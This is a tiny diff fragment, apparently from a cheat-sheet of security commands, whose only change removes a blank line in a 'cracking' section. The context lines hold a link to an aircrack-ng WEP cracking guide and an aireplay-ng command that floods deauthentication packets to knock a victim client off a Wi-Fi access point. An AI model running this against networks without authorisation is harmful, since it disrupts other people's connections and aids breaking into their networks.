@@ -1645,7 +1645,6 @@ cracking
 EOT
 https://www.aircrack-ng.org/doku.php?id=simple_wep_crack
 EOR
-
 aireplay-ng -0 0 --ignore-negative-one -e [SSID] -a [AP MAC] -c [VICTIM MAC] mon0
 wep cracking
 EOC
